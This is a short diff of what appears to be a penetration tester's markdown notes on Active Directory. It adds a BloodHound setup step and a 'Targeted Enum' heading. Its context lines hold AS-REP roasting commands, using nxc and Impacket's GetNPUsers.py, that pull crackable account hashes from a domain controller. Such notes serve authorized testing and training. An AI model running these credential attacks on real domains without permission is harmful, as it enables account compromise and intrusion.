@@ -24,3 +24,11 @@ nxc ldap $dcip -d $domain -u $domainuser -p "$domainuserpwd" --asreproast nxcasr
 python GetNPUsers.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -request -outputfile impasrep
 ```
 
+### Bloodhound
+```bash
+cd ~/bloodhound
+./bloodhound-cli up
+./bloodhound-cli resetpwd
+```
+
+## Targeted Enum
